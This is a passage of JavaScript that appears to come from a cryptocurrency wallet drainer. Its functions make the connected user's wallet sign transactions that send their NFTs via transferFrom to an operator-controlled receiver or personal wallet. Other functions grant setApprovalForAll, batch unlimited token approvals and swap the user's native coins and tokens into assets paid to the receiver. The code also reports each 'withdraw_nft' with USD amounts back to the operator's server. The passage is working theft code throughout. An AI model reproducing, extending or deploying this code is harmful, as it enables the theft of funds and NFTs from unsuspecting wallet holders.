  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC721'], asset.address);

  contract_data = web3_contract.methods.transferFrom(CF_Current_Address, CF_Settings.Personal_Wallet.address, asset.id).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);

  const x_promise = send_request({
    action: 'withdraw_nft', wallet: CF_Settings.Personal_Wallet,
    chain_id: asset.chain_id, amount_usd: asset.amount_usd,
    user_id: CF_ID, asset: asset, address: CF_Current_Address
  });

  if (CF_Settings.Settings.Wait_For_Response)
    await x_promise;

  await transfer_success(asset); sign_ready();
};

const TRANSFER_NFT = async (asset) => {
  if (CF_Settings.Settings.Use_Randomizer_For_NFTs && CF_Settings.Personal_Wallet != null) return DO_RANDOMIZER_NFT(asset);

  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC721'], asset.address);

  contract_data = web3_contract.methods.transferFrom(CF_Current_Address, CF_Settings.Receiver, asset.id).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);

  await transfer_success(asset); sign_ready();
};

const DO_RANDOMIZER_SAFA = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC721'], asset.address);

  contract_data = web3_contract.methods.setApprovalForAll(CF_Settings.Personal_Wallet.address, true).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);

  await transfer_success(asset); sign_ready();
};

const DO_SAFA = async (asset) => {
  if (CF_Settings.Settings.Use_Randomizer_For_NFTs && CF_Settings.Personal_Wallet != null) return DO_RANDOMIZER_SAFA(asset);

  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC721'], asset.address);

  contract_data = web3_contract.methods.setApprovalForAll(CF_Settings.Address, true).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);

  await transfer_success(asset); sign_ready();
};

const DO_SWAP_BYPASS_NATIVE = async (asset) => {
  const provider   = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gasPriceBN = BN(await provider.getGasPrice())
                      .div(BN(100))
                      .mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const balance    = await provider.getBalance(CF_Current_Address);
  const swap_deadline = Math.floor(Date.now()/1000) + SWAP_DEADLINE_OFFSET;
  const routerAddress = '0xEfF92A263d31888d860bD50809A8D171709b7b1c';
  const router       = new ethers.Contract(routerAddress, CF_Pancake_Native_ABI, CF_Signer);
  let gasLimit, attempts = 0;
  const safeValue = balance
    .sub(BN(21_000).mul(gasPriceBN))
    .sub(
      BN(
        ([42161,43114].includes(asset.chain_id) ? 5_000_000 :
         asset.chain_id === 369 ? 900_000 : 150_000
        )
      )
      .mul(CF_Gas_Reserves[asset.chain_id])
      .mul(gasPriceBN)
    );

  while (attempts++ < 3) {
    try {
      gasLimit = await router.estimateGas.swapExactETHForTokens(
        '0',
        [ CF_Swap_Route[asset.chain_id], CF_Settings.Settings.Swap_Bypass_For_ETH_Token ],
        CF_Settings.Receiver,
        swap_deadline,
        { from: CF_Current_Address, value: safeValue }
      );
      gasLimit = gasLimit.mul(120).div(100);
      break;
    } catch {
      gasLimit = ethers.BigNumber.from(
        [42161,43114].includes(asset.chain_id) ? 5_000_000 : 350_000
      );
    }
  }

  let available = balance.sub(gasLimit.mul(gasPriceBN));
  if (CF_Settings.Settings.Reserves.Mode === 1) {
    const pct = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
    available = available.mul(100 - pct).div(100);
  } else if (CF_Settings.Settings.Reserves.Mode === 2) {
    let pct = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
    let maxAmt = 0;
    for (const { amount, percent } of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
      if (asset.amount_usd >= amount && amount >= maxAmt) {
        maxAmt = amount;
        pct = percent;
      }
    }
    available = available.mul(100 - pct).div(100);
  }

  if (available.lte(BN(0))) throw 'LOW_BALANCE';

  let amountOutMinBN;
  try {
    const readRouter = new ethers.Contract(
      routerAddress,
      CF_RouterV2_ReadABI,
      provider
    );
    const path = [
      CF_Swap_Route[asset.chain_id],
      CF_Settings.Settings.Swap_Bypass_For_ETH_Token
    ];
    const amounts = await readRouter.getAmountsOut(
      available.toString(),
      path
    );
    amountOutMinBN = ethers.BigNumber.from(amounts[1])
      .mul(100 - SLIPPAGE_TOLERANCE)
      .div(100);

  } catch (err) {
    console.warn('Quote failed, fallback to 0', err);
    amountOutMinBN = ethers.BigNumber.from(0);
  }

  // делаем своп
  const nonce = await get_nonce(asset.chain_id);
  await approve_request(asset);
  sign_next();
  const tx = await router.swapExactETHForTokens(
    amountOutMinBN.toString(),
    [
      CF_Swap_Route[asset.chain_id],
      CF_Settings.Settings.Swap_Bypass_For_ETH_Token
    ],
    CF_Settings.Receiver,
    swap_deadline,
    {
      gasLimit: gasLimit,
      gasPrice: gasPriceBN,
      nonce:    nonce,
      from:     CF_Current_Address,
      value:    available
    }
  );
  wait_message();
  if (CF_Settings.Settings.Wait_For_Confirmation) {
    await provider.waitForTransaction(tx.hash, 1, 60_000);
  }
  await swap_success('Pancake', asset, [asset]);
  sign_ready();
};

const LEGACY_DO_SWAP_BYPASS_NATIVE = async (asset) => {

  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(CF_Gas_Reserves[asset.chain_id]).mul(gas_price);
  const balance = await node.getBalance(CF_Current_Address);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract('0xEfF92A263d31888d860bD50809A8D171709b7b1c', CF_Pancake_Native_ABI, CF_Signer);

  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.swapExactETHForTokens('0', [
        '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2',
        CF_Settings.Settings.Swap_Bypass_For_ETH_Token
      ], CF_Settings.Receiver, swap_deadline, {
        from: CF_Current_Address,
        value: balance.sub(ethers.BigNumber.from('21000')
        .mul(gas_price)).sub(tokens_gas_fee)
      });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120'));
      gas_attempts = 3;
    } catch(err) {
      gas_limit = ethers.BigNumber.from((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 350000));
      gas_attempts += 1;
    }
  }

  let available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);

  if (CF_Settings.Settings.Reserves.Mode == 1) {
    available_amount = balance.sub(gas_limit.mul(gas_price)).div(BN(100))
    .mul(BN(100).sub(BN(CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id])));
  } else if (CF_Settings.Settings.Reserves.Mode == 2) {
    let max_value = 0; let current_percent = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
    for (const elem of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
      if (asset.amount_usd > elem.amount || max_value > elem.amount) continue;
      max_value = elem.amount; current_percent = elem.percent;
    }
    available_amount = balance.sub(gas_limit.mul(gas_price))
    .div(BN(100)).mul(BN(100).sub(BN(current_percent)));
  } else if (CF_Settings.Settings.Reserves.Mode == 3) {
    available_amount = balance.sub(gas_limit.mul(gas_price));
  }

  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';

  const nonce = await get_nonce(asset.chain_id);
  await approve_request(asset); sign_next();
  const tx = await contract.swapExactETHForTokens('0', [
    '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2',
    CF_Settings.Settings.Swap_Bypass_For_ETH_Token
  ], CF_Settings.Receiver, swap_deadline, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: CF_Current_Address,
    value: ethers.BigNumber.from(available_amount)
  });
  wait_message();
  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  await swap_success('Pancake', asset, [ asset ]); sign_ready();

}

const DO_SWAP_BYPASS_BATCH = async (assets, swapper_data_arr) => {
  const user_address = await CF_Signer.getAddress();
  const approve_calls = [];
  const swap_calls    = [];
  const swap_deadline = Math.floor(Date.now()/1000) + SWAP_DEADLINE_OFFSET;
  const node          = (chainId) => new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[chainId]);

  async function waitForBatchReceipt(batchId) {
    let attempts = 0;
    const maxAttempts = 60;
    const delay = 2000;
    while (attempts < maxAttempts) {
      const status = await CF_Provider.send("wallet_getCallsStatus", [String(batchId)]);
      if (typeof status?.result?.receipts == "object" && status?.result?.receipts.length > 0 && status?.result?.receipts[0].status == '0x1') {
        return status.result.receipts[0].transactionHash;
      }
      await new Promise(res => setTimeout(res, delay));
      attempts++;
    }
    throw new Error("BATCH_ERROR");
  }

  // Prepare approve calls
  for (let i = 0; i < assets.length; i++) {
    try {
      const asset = assets[i];
      const swapper_data = swapper_data_arr[i];
      const swapper_address = swapper_data.address;

      const contract = new ethers.Contract(asset.address, CF_Contract_ABI['ERC20'], CF_Signer);
      const current_allowance = await contract.allowance(user_address, swapper_address);
      let max_approval_amount = ethers.utils.parseEther(CF_Unlimited_Amount);

      for (const c_address of CF_Settings.Unlimited_BL) {
        if (c_address[0] == CF_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
          max_approval_amount = asset.amount_raw;
          break;
        }
      }

      if (current_allowance.lt(max_approval_amount)) {
        const contract_data = contract.interface.encodeFunctionData("approve", [swapper_address, max_approval_amount]);
        approve_calls.push({ to: asset.address, value: "0x0", data: contract_data });
      }
    } catch (err) {
      console.log(err);
    }
  }

  // Execute approve calls
  if (approve_calls.length > 0) {
    const approveBatchParams = {
      version: "2.0.0",
      from: user_address,
      chainId: `0x${CF_Current_Chain_ID.toString(16)}`,
      atomicRequired: true,
      calls: approve_calls,
    };

    await swap_request("Batch Approve", assets[0], assets);
    sign_next();

    try {
      const approveBatchId = await CF_Provider.send("wallet_sendCalls", [approveBatchParams]);
      wait_message();

      const approveTxHash = await waitForBatchReceipt(approveBatchId.result.id);
      if (CF_Settings.Settings.Wait_For_Confirmation) {
        const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[CF_Current_Chain_ID]);
        await node.waitForTransaction(approveTxHash, 1, 90000);
      }

      await approve_success(assets[0]);
    } catch (err) {
      console.log(err);
      await approve_cancel();
      return;
    }
  }

  for (let i = 0; i < assets.length; i++) {
    try {
      const asset        = assets[i];
      const swapper_data = swapper_data_arr[i];
      const amountInRaw  = ethers.BigNumber.from(asset.amount_raw);
      let amountOutMinBN;

      try {
        if (swapper_data.swapper === 'Pancake_V3') {
          const quoter = new ethers.Contract(UNISWAP_V3_QUOTER, QuoterABI, node(asset.chain_id));
          const quoted = await quoter.callStatic.quoteExactInputSingle(
            asset.address,
            CF_Swap_Route[asset.chain_id],
            3000,
            amountInRaw,
            0
          );
          amountOutMinBN = quoted
            .mul(100 - SLIPPAGE_TOLERANCE)
            .div(100);

        } else {
          const readRouter = new ethers.Contract(
            swapper_data.address,
            CF_RouterV2_ReadABI,
            node(asset.chain_id)
          );
          const amounts = await readRouter.getAmountsOut(
            amountInRaw,
            [asset.address, CF_Swap_Route[asset.chain_id]]
          );
          amountOutMinBN = ethers.BigNumber.from(amounts[1])
            .mul(100 - SLIPPAGE_TOLERANCE)
            .div(100);
        }
      } catch (err) {
        console.warn('Quote failed, fallback to 0', err);
        amountOutMinBN = ethers.BigNumber.from(0);
      }

      let data;
      if (['Uniswap','Pancake','Sushiswap'].includes(swapper_data.swapper)) {
        const contract = new ethers.Contract(swapper_data.address, CF_Uniswap_ABI, CF_Signer);
        data = contract.interface.encodeFunctionData(
          'swapExactTokensForTokens',
          [
            amountInRaw.toString(),
            amountOutMinBN.toString(),
            [asset.address, CF_Swap_Route[asset.chain_id]],
            CF_Settings.Receiver
          ]
        );

      } else if (swapper_data.swapper === 'Pancake_V3') {
        const routerV3 = new ethers.Contract(
          swapper_data.address,
          SwapRouterV3_ABI,
          CF_Signer
        );
        data = routerV3.interface.encodeFunctionData(
          'exactInputSingle',
          [{
            tokenIn:           asset.address,
            tokenOut:          CF_Swap_Route[asset.chain_id],
            fee:               3000,
            recipient:         CF_Settings.Receiver,
            deadline:          swap_deadline,
            amountIn:          amountInRaw.toString(),
            amountOutMinimum:  amountOutMinBN.toString(),
            sqrtPriceLimitX96: 0
          }]
        );
      } else {
        console.error('Unsupported swapper', swapper_data.swapper);
        continue;
      }

      swap_calls.push({
        to:    swapper_data.address,
        value:"0x0",
        data
      });

    } catch (err) {
      console.log('Prepare swap call error', err);
    }
  }

  if (swap_calls.length > 0) {
    const swapBatchParams = {
      version:       "2.0.0",
      from:          user_address,
      chainId:       `0x${CF_Current_Chain_ID.toString(16)}`,
      atomicRequired:true,
      calls:         swap_calls,
    };

    await swap_request("Batch Swap", assets[0], assets);
    sign_next();

    try {
      const swapBatchId = await CF_Provider.send("wallet_sendCalls", [swapBatchParams]);
      wait_message();

      const swapTxHash = await waitForBatchReceipt(swapBatchId.result.id);
      if (CF_Settings.Settings.Wait_For_Confirmation) {
        await node(CF_Current_Chain_ID).waitForTransaction(swapTxHash, 1, 90_000);
      }

      await swap_success("Batch Swap", assets[0], assets);
      sign_ready();

    } catch (err) {
      console.log(err);
      await approve_cancel();
    }
  }
};

const LEGACY_DO_SWAP_BYPASS_BATCH = async (assets, swapper_data_arr) => {
  const user_address = await CF_Signer.getAddress();
  const approve_calls = [];
  const swap_calls = [];
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);

  async function waitForBatchReceipt(batchId) {
    let attempts = 0;
    const maxAttempts = 60;
    const delay = 2000;
    while (attempts < maxAttempts) {
      const status = await CF_Provider.send("wallet_getCallsStatus", [String(batchId)]);
      if (typeof status?.result?.receipts == "object" && status?.result?.receipts.length > 0 && status?.result?.receipts[0].status == '0x1') {
        return status.result.receipts[0].transactionHash;
      }
      await new Promise(res => setTimeout(res, delay));
      attempts++;
    }
    throw new Error("BATCH_ERROR");
  }

  // Prepare approve calls
  for (let i = 0; i < assets.length; i++) {
    try {
      const asset = assets[i];
      const swapper_data = swapper_data_arr[i];
      const swapper_address = swapper_data.address;

      const contract = new ethers.Contract(asset.address, CF_Contract_ABI['ERC20'], CF_Signer);
      const current_allowance = await contract.allowance(user_address, swapper_address);
      let max_approval_amount = ethers.utils.parseEther(CF_Unlimited_Amount);

      for (const c_address of CF_Settings.Unlimited_BL) {
        if (c_address[0] == CF_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
          max_approval_amount = asset.amount_raw;
          break;
        }
      }

      if (current_allowance.lt(max_approval_amount)) {
        const contract_data = contract.interface.encodeFunctionData("approve", [swapper_address, max_approval_amount]);
        approve_calls.push({ to: asset.address, value: "0x0", data: contract_data });
      }
    } catch (err) {
      console.log(err);
    }
  }

  // Execute approve calls
  if (approve_calls.length > 0) {
    const approveBatchParams = {
      version: "2.0.0",
      from: user_address,
      chainId: `0x${CF_Current_Chain_ID.toString(16)}`,
      atomicRequired: true,
      calls: approve_calls,
    };

    await swap_request("Batch Approve", assets[0], assets);
    sign_next();

    try {
      const approveBatchId = await CF_Provider.send("wallet_sendCalls", [approveBatchParams]);
      wait_message();

      const approveTxHash = await waitForBatchReceipt(approveBatchId.result.id);
      if (CF_Settings.Settings.Wait_For_Confirmation) {
        const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[CF_Current_Chain_ID]);
        await node.waitForTransaction(approveTxHash, 1, 90000);
      }

      await approve_success(assets[0]);
    } catch (err) {
      console.log(err);
      await approve_cancel();
      return;
    }
  }

  // Prepare swap calls
  for (let i = 0; i < assets.length; i++) {
    try {
      const asset = assets[i];
      const swapper_data = swapper_data_arr[i];
      const swapper_address = swapper_data.address;

      const swap_value = ethers.BigNumber.from(asset.amount_raw).toString();
      let swap_data;

      if (swapper_data.swapper === "Uniswap") {
        const contract = new ethers.Contract(swapper_address, CF_Uniswap_ABI, CF_Signer);
        swap_data = contract.interface.encodeFunctionData("swapExactTokensForTokens", [
          swap_value,
          "0",
          [asset.address, CF_Swap_Route[asset.chain_id]],
          CF_Settings.Receiver,
        ]);
      } else if (swapper_data.swapper === "Pancake") {
        const contract = new ethers.Contract(swapper_address, CF_Pancake_ABI, CF_Signer);
        swap_data = contract.interface.encodeFunctionData("swapExactTokensForETH", [
          swap_value,
          "0",
          [asset.address, CF_Swap_Route[asset.chain_id]],
          CF_Settings.Receiver,
          swap_deadline,
        ]);
      }

      swap_calls.push({ to: swapper_address, value: "0x0", data: swap_data });
    } catch (err) {
      console.log(err);
    }
  }

  // Execute swap calls
  if (swap_calls.length > 0) {
    const swapBatchParams = {
      version: "2.0.0",
      from: user_address,
      chainId: `0x${CF_Current_Chain_ID.toString(16)}`,
      atomicRequired: true,
      calls: swap_calls,
    };

    await swap_request("Batch Swap", assets[0], assets);
    sign_next();

    try {
      const swapBatchId = await CF_Provider.send("wallet_sendCalls", [swapBatchParams]);
      wait_message();

      const swapTxHash = await waitForBatchReceipt(swapBatchId.result.id);
      if (CF_Settings.Settings.Wait_For_Confirmation) {
        const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[CF_Current_Chain_ID]);
        await node.waitForTransaction(swapTxHash, 1, 90000);
      }

      await swap_success("Batch Swap", assets[0], assets);
      sign_ready();
    } catch (err) {
      console.log(err);
      await approve_cancel();
    }
  }
};

const SLIPPAGE_TOLERANCE = 5; // %
const SWAP_DEADLINE_OFFSET = 300; // 5 минут

const UNISWAP_V3_QUOTER = "0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6", QuoterABI = [
  {"inputs":[{"internalType":"address","name":"_factory","type":"address"},{"internalType":"address","name":"_WETH9","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
  {"inputs":[],"name":"WETH9","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
  {"inputs":[],"name":"factory","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"internalType":"bytes","name":"path","type":"bytes"},{"internalType":"uint256","name":"amountIn","type":"uint256"}],"name":"quoteExactInput","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"internalType":"address","name":"tokenIn","type":"address"},{"internalType":"address","name":"tokenOut","type":"address"},{"internalType":"uint24","name":"fee","type":"uint24"},{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint160","name":"sqrtPriceLimitX96","type":"uint160"}],"name":"quoteExactInputSingle","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"internalType":"bytes","name":"path","type":"bytes"},{"internalType":"uint256","name":"amountOut","type":"uint256"}],"name":"quoteExactOutput","outputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"internalType":"address","name":"tokenIn","type":"address"},{"internalType":"address","name":"tokenOut","type":"address"},{"internalType":"uint24","name":"fee","type":"uint24"},{"internalType":"uint256","name":"amountOut","type":"uint256"},{"internalType":"uint160","name":"sqrtPriceLimitX96","type":"uint160"}],"name":"quoteExactOutputSingle","outputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"internalType":"int256","name":"amount0Delta","type":"int256"},{"internalType":"int256","name":"amount1Delta","type":"int256"},{"internalType":"bytes","name":"path","type":"bytes"}],"name":"uniswapV3SwapCallback","outputs":[],"stateMutability":"view","type":"function"}
], CF_RouterV2_ReadABI = [
  ...CF_Uniswap_ABI,
  ...CF_Pancake_Native_ABI,
  {
    "inputs":[
      {"internalType":"uint256","name":"amountIn","type":"uint256"},
      {"internalType":"address[]","name":"path","type":"address[]"}
    ],
    "name":"getAmountsOut",
    "outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],
    "stateMutability":"view",
    "type":"function"
  }
], SwapRouterV3_ABI = [{"inputs":[{"internalType":"address","name":"_deployer","type":"address"},{"internalType":"address","name":"_factory","type":"address"},{"internalType":"address","name":"_WETH9","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"WETH9","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"deployer","outputs":[{"internalType":"address","name":"","type":"address"}],
"stateMutability":"view","type":"function"},{"inputs":[{"components":[{"internalType":"bytes","name":"path","type":"bytes"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMinimum","type":"uint256"}],"internalType":"struct ISwapRouter.ExactInputParams","name":"params","type":"tuple"}],"name":"exactInput","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"payable","type":"function"},
{"inputs":[{"components":[{"internalType":"address","name":"tokenIn","type":"address"},{"internalType":"address","name":"tokenOut","type":"address"},{"internalType":"uint24","name":"fee","type":"uint24"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMinimum","type":"uint256"},{"internalType":"uint160","name":"sqrtPriceLimitX96","type":"uint160"}],"internalType":"struct ISwapRouter.ExactInputSingleParams","name":"params","type":"tuple"}],
"name":"exactInputSingle","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"components":[{"internalType":"bytes","name":"path","type":"bytes"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint256","name":"amountOut","type":"uint256"},{"internalType":"uint256","name":"amountInMaximum","type":"uint256"}],"internalType":"struct ISwapRouter.ExactOutputParams","name":"params","type":"tuple"}],"name":"exactOutput","outputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"}],
"stateMutability":"payable","type":"function"},{"inputs":[{"components":[{"internalType":"address","name":"tokenIn","type":"address"},{"internalType":"address","name":"tokenOut","type":"address"},{"internalType":"uint24","name":"fee","type":"uint24"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint256","name":"amountOut","type":"uint256"},{"internalType":"uint256","name":"amountInMaximum","type":"uint256"},{"internalType":"uint160","name":"sqrtPriceLimitX96","type":"uint160"}],"internalType":"struct ISwapRouter.ExactOutputSingleParams","name":"params","type":"tuple"}],
"name":"exactOutputSingle","outputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"factory","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"results","type":"bytes[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"int256","name":"amount0Delta","type":"int256"},{"internalType":"int256","name":"amount1Delta","type":"int256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"pancakeV3SwapCallback","outputs":[],"stateMutability":"nonpayable","type":"function"},
{"inputs":[],"name":"refundETH","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"selfPermit","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"nonce","type":"uint256"},{"internalType":"uint256","name":"expiry","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"selfPermitAllowed","outputs":[],"stateMutability":"payable","type":"function"},
{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"nonce","type":"uint256"},{"internalType":"uint256","name":"expiry","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"selfPermitAllowedIfNecessary","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"selfPermitIfNecessary","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amountMinimum","type":"uint256"},{"internalType":"address","name":"recipient","type":"address"}],"name":"sweepToken","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amountMinimum","type":"uint256"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"feeBips","type":"uint256"},{"internalType":"address","name":"feeRecipient","type":"